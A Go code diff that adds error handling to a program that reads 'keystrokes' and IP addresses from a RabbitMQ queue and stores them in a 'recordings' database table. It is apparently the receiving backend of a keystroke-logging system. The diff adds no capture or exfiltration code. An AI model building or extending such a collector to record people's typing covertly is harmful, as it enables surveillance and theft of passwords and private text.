@@ -26,12 +26,15 @@ func main() {
 	// Receive keystrokes
 	amqpConn, err := amqp.Dial(os.Getenv("RABBITMQ_URI"))
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalf("Error connecting to RabbitMQ: %v", err)
 	}
 	defer amqpConn.Close()
-	channelAmqp, _ := amqpConn.Channel()
+	channelAmqp, err := amqpConn.Channel()
+	if err != nil {
+		log.Fatalf("Error creating RabbitMQ channel: %v", err)
+	}
 	forever := make(chan bool)
-	msgs, _ := channelAmqp.Consume(
+	msgs, err := channelAmqp.Consume(
 		os.Getenv("RABBITMQ_QUEUE"),
 		"",
 		true,
@@ -40,14 +43,20 @@ func main() {
 		false,
 		nil,
 	)
+	if err != nil {
+		log.Fatalf("Error consuming from queue: %v", err)
+	}
 
 	go func() {
 		for d := range msgs {
 			msg := strings.Split(string(d.Body), ":")
 			ip, keystrokes := msg[0], msg[1]
 			log.Printf("Received a message: %s", keystrokes)
-			db.Query("INSERT into recordings(ip_address, time_stamp, keystrokes) VALUES($1, $2, $3);",
+			_, err = db.Query("INSERT into recordings(ip_address, time_stamp, keystrokes) VALUES($1, $2, $3);",
 				ip, d.Timestamp, keystrokes)
+			if err != nil {
+				log.Fatalf("Error inserting row: %v", err)
+			}
 		}
 	}()
 
